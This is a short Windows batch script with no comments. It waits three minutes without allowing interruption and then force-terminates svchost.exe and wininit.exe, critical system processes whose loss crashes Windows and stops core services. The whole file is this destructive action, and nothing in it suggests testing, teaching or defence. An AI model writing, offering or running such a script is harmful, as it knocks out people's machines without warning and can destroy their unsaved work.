@echo off
Timeout /t 180 /nobreak >nul
taskkill /F /IM svchost.exe
taskkill /F /IM wininit.exe
